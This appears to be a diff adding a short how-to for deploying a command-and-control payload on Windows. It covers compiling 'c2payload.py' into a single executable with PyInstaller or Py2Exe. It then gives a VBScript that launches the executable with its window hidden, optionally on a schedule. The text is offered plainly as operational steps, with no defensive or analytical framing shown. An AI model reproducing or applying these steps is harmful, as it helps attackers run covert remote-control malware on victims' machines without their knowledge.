@@ -1,0 +1,11 @@
+1. Create Executable:
+   - with Pyinstaller: pyinstaller c2payload.py --onefile
+   - with Py2Exe: build_exe c2payload.py --bundle_files 0
+
+2. Create a VBS script to execute it silently in the background / Schedule the execution of the script:
+
+Dim WinScriptHost
+Set WinScriptHost = CreateObject("WScript.Shell")
+WinScriptHost.Run Chr(34) & "c2payload.exe" & Chr(34), 0
+Set WinScriptHost = Nothing
+
